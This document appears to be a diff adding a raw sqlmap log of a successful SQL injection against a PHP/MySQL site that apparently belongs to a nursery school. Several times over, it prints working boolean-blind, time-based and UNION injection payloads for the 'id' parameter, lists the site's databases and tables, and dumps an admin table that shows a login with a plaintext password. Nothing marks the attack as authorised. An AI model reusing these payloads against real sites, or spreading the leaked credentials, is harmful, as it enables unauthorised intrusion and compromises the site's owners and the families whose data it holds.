@@ -1,0 +1,359 @@
+sqlmap identified the following injection point(s) with a total of 86 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=441 AND 5593=5593
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=441 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 8 columns
+    Payload: id=-5819 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x71767a7871,0x7a4875707769735875736a53736d77554853496174546b5a5773774351726b785349644644794166,0x71626b6271),NULL,NULL#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,[QUERY],NULL,NULL#
+---
+web application technology: Apache, PHP 5.6.40
+back-end DBMS: MySQL >= 5.0.12
+available databases [3]:
+[*] bercarioescolalu_bercario_gestor
+[*] bercarioescolalu_wordpress
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=441 AND 5593=5593
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=441 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 8 columns
+    Payload: id=-5819 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x71767a7871,0x7a4875707769735875736a53736d77554853496174546b5a5773774351726b785349644644794166,0x71626b6271),NULL,NULL#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,[QUERY],NULL,NULL#
+---
+web application technology: Apache, PHP 5.6.40
+back-end DBMS: MySQL >= 5.0.12
+available databases [3]:
+[*] bercarioescolalu_bercario_gestor
+[*] bercarioescolalu_wordpress
+[*] information_schema
+
+Database: bercarioescolalu_wordpress
+[13 tables]
++---------------------------------------+
+| wp_commentmeta                        |
+| wp_comments                           |
+| wp_links                              |
+| wp_options                            |
+| wp_postmeta                           |
+| wp_posts                              |
+| wp_smush_dir_images                   |
+| wp_term_relationships                 |
+| wp_term_taxonomy                      |
+| wp_termmeta                           |
+| wp_terms                              |
+| wp_usermeta                           |
+| wp_users                              |
++---------------------------------------+
+
+Database: bercarioescolalu_bercario_gestor
+[8 tables]
++---------------------------------------+
+| adm                                   |
+| cadastro                              |
+| conteudo                              |
+| foto                                  |
+| galeria                               |
+| galeria_fotos                         |
+| profissao                             |
+| tipo                                  |
++---------------------------------------+
+
+Database: information_schema
+[77 tables]
++---------------------------------------+
+| ALL_PLUGINS                           |
+| APPLICABLE_ROLES                      |
+| CHARACTER_SETS                        |
+| CLIENT_STATISTICS                     |
+| COLLATIONS                            |
+| COLLATION_CHARACTER_SET_APPLICABILITY |
+| COLUMNS                               |
+| COLUMN_PRIVILEGES                     |
+| ENABLED_ROLES                         |
+| ENGINES                               |
+| EVENTS                                |
+| FILES                                 |
+| GLOBAL_STATUS                         |
+| GLOBAL_VARIABLES                      |
+| INDEX_STATISTICS                      |
+| INNODB_BUFFER_PAGE                    |
+| INNODB_BUFFER_PAGE_LRU                |
+| INNODB_BUFFER_POOL_STATS              |
+| INNODB_CHANGED_PAGES                  |
+| INNODB_CMP                            |
+| INNODB_CMPMEM                         |
+| INNODB_CMPMEM_RESET                   |
+| INNODB_CMP_PER_INDEX                  |
+| INNODB_CMP_PER_INDEX_RESET            |
+| INNODB_CMP_RESET                      |
+| INNODB_FT_BEING_DELETED               |
+| INNODB_FT_CONFIG                      |
+| INNODB_FT_DEFAULT_STOPWORD            |
+| INNODB_FT_DELETED                     |
+| INNODB_FT_INDEX_CACHE                 |
+| INNODB_FT_INDEX_TABLE                 |
+| INNODB_LOCKS                          |
+| INNODB_LOCK_WAITS                     |
+| INNODB_METRICS                        |
+| INNODB_SYS_COLUMNS                    |
+| INNODB_SYS_DATAFILES                  |
+| INNODB_SYS_FIELDS                     |
+| INNODB_SYS_FOREIGN                    |
+| INNODB_SYS_FOREIGN_COLS               |
+| INNODB_SYS_INDEXES                    |
+| INNODB_SYS_TABLES                     |
+| INNODB_SYS_TABLESPACES                |
+| INNODB_SYS_TABLESTATS                 |
+| INNODB_TRX                            |
+| KEY_CACHES                            |
+| KEY_COLUMN_USAGE                      |
+| PARAMETERS                            |
+| PARTITIONS                            |
+| PLUGINS                               |
+| PROCESSLIST                           |
+| PROFILING                             |
+| REFERENTIAL_CONSTRAINTS               |
+| ROUTINES                              |
+| SCHEMATA                              |
+| SCHEMA_PRIVILEGES                     |
+| SESSION_STATUS                        |
+| SESSION_VARIABLES                     |
+| STATISTICS                            |
+| TABLES                                |
+| TABLESPACES                           |
+| TABLE_CONSTRAINTS                     |
+| TABLE_PRIVILEGES                      |
+| TABLE_STATISTICS                      |
+| TRIGGERS                              |
+| TokuDB_background_job_status          |
+| TokuDB_file_map                       |
+| TokuDB_fractal_tree_block_map         |
+| TokuDB_fractal_tree_info              |
+| TokuDB_lock_waits                     |
+| TokuDB_locks                          |
+| TokuDB_trx                            |
+| USER_PRIVILEGES                       |
+| USER_STATISTICS                       |
+| VIEWS                                 |
+| XTRADB_INTERNAL_HASH_TABLES           |
+| XTRADB_READ_VIEW                      |
+| XTRADB_RSEG                           |
++---------------------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=441 AND 5593=5593
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=441 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 8 columns
+    Payload: id=-5819 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x71767a7871,0x7a4875707769735875736a53736d77554853496174546b5a5773774351726b785349644644794166,0x71626b6271),NULL,NULL#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,[QUERY],NULL,NULL#
+---
+web application technology: Apache, PHP 5.6.40
+back-end DBMS: MySQL >= 5.0.12
+Database: bercarioescolalu_bercario_gestor
+[8 tables]
++---------------+
+| adm           |
+| cadastro      |
+| conteudo      |
+| foto          |
+| galeria       |
+| galeria_fotos |
+| profissao     |
+| tipo          |
++---------------+
+
+Database: bercarioescolalu_bercario_gestor
+Table: adm
+[1 entry]
++----+---------------+-------+-----------+---------------+-------+
+| id | nome          | nivel | senha     | login         | email |
++----+---------------+-------+-----------+---------------+-------+
+| 22 | administrador | 1     | web1038bz | administrador | NULL  |
++----+---------------+-------+-----------+---------------+-------+
+
+Database: bercarioescolalu_bercario_gestor
+Table: cadastro
+[0 entries]
++----+--------+-----+-----+-----+------+-------+-------+-------+--------+--------+--------+----------+----------+-----------+------------+
+| id | cidade | cpf | cep | crm | nome | senha | ativo | email | imagem | bairro | estado | telefone | endereco | data_nasc | curriculum |
++----+--------+-----+-----+-----+------+-------+-------+-------+--------+--------+--------+----------+----------+-----------+------------+
++----+--------+-----+-----+-----+------+-------+-------+-------+--------+--------+--------+----------+----------+-----------+------------+
+
+Database: bercarioescolalu_bercario_gestor
+Table: conteudo
+[0 entries]
++---------+------------+-----------+-----------+
+| cor     | data       | categoria | descricao |
++---------+------------+-----------+-----------+
++---------+------------+-----------+-----------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=441 AND 5593=5593
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=441 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 8 columns
+    Payload: id=-5819 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x71767a7871,0x7a4875707769735875736a53736d77554853496174546b5a5773774351726b785349644644794166,0x71626b6271),NULL,NULL#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,[QUERY],NULL,NULL#
+---
+web application technology: Apache, PHP 5.6.40
+back-end DBMS: MySQL >= 5.0.12
+available databases [3]:
+[*] bercarioescolalu_bercario_gestor
+[*] bercarioescolalu_wordpress
+[*] information_schema
+
+Database: bercarioescolalu_wordpress
+[13 tables]
++---------------------------------------+
+| wp_commentmeta                        |
+| wp_comments                           |
+| wp_links                              |
+| wp_options                            |
+| wp_postmeta                           |
+| wp_posts                              |
+| wp_smush_dir_images                   |
+| wp_term_relationships                 |
+| wp_term_taxonomy                      |
+| wp_termmeta                           |
+| wp_terms                              |
+| wp_usermeta                           |
+| wp_users                              |
++---------------------------------------+
+
+Database: bercarioescolalu_bercario_gestor
+[8 tables]
++---------------------------------------+
+| adm                                   |
+| cadastro                              |
+| conteudo                              |
+| foto                                  |
+| galeria                               |
+| galeria_fotos                         |
+| profissao                             |
+| tipo                                  |
++---------------------------------------+
+
+Database: information_schema
+[77 tables]
++---------------------------------------+
+| ALL_PLUGINS                           |
+| APPLICABLE_ROLES                      |
+| CHARACTER_SETS                        |
+| CLIENT_STATISTICS                     |
+| COLLATIONS                            |
+| COLLATION_CHARACTER_SET_APPLICABILITY |
+| COLUMNS                               |
+| COLUMN_PRIVILEGES                     |
+| ENABLED_ROLES                         |
+| ENGINES                               |
+| EVENTS                                |
+| FILES                                 |
+| GLOBAL_STATUS                         |
+| GLOBAL_VARIABLES                      |
+| INDEX_STATISTICS                      |
+| INNODB_BUFFER_PAGE                    |
+| INNODB_BUFFER_PAGE_LRU                |
+| INNODB_BUFFER_POOL_STATS              |
+| INNODB_CHANGED_PAGES                  |
+| INNODB_CMP                            |
+| INNODB_CMPMEM                         |
+| INNODB_CMPMEM_RESET                   |
+| INNODB_CMP_PER_INDEX                  |
+| INNODB_CMP_PER_INDEX_RESET            |
+| INNODB_CMP_RESET                      |
+| INNODB_FT_BEING_DELETED               |
+| INNODB_FT_CONFIG                      |
+| INNODB_FT_DEFAULT_STOPWORD            |
+| INNODB_FT_DELETED                     |
+| INNODB_FT_INDEX_CACHE                 |
+| INNODB_FT_INDEX_TABLE                 |
+| INNODB_LOCKS                          |
+| INNODB_LOCK_WAITS                     |
+| INNODB_METRICS                        |
+| INNODB_SYS_COLUMNS                    |
+| INNODB_SYS_DATAFILES                  |
+| INNODB_SYS_FIELDS                     |
+| INNODB_SYS_FOREIGN                    |
+| INNODB_SYS_FOREIGN_COLS               |
+| INNODB_SYS_INDEXES                    |
+| INNODB_SYS_TABLES                     |
+| INNODB_SYS_TABLESPACES                |
+| INNODB_SYS_TABLESTATS                 |
+| INNODB_TRX                            |
+| KEY_CACHES                            |
+| KEY_COLUMN_USAGE                      |
+| PARAMETERS                            |
+| PARTITIONS                            |
+| PLUGINS                               |
+| PROCESSLIST                           |
+| PROFILING                             |
+| REFERENTIAL_CONSTRAINTS               |
+| ROUTINES                              |
+| SCHEMATA                              |
+| SCHEMA_PRIVILEGES                     |
+| SESSION_STATUS                        |
+| SESSION_VARIABLES                     |
+| STATISTICS                            |
+| TABLES                                |
+| TABLESPACES                           |
+| TABLE_CONSTRAINTS                     |
+| TABLE_PRIVILEGES                      |
+| TABLE_STATISTICS                      |
+| TRIGGERS                              |
+| TokuDB_background_job_status          |
+| TokuDB_file_map                       |
+| TokuDB_fractal_tree_block_map         |
+| TokuDB_fractal_tree_info              |
+| TokuDB_lock_waits                     |
+| TokuDB_locks                          |
+| TokuDB_trx                            |
+| USER_PRIVILEGES                       |
+| USER_STATISTICS                       |
+| VIEWS                                 |
+| XTRADB_INTERNAL_HASH_TABLES           |
+| XTRADB_READ_VIEW                      |
+| XTRADB_RSEG                           |
++---------------------------------------+
+
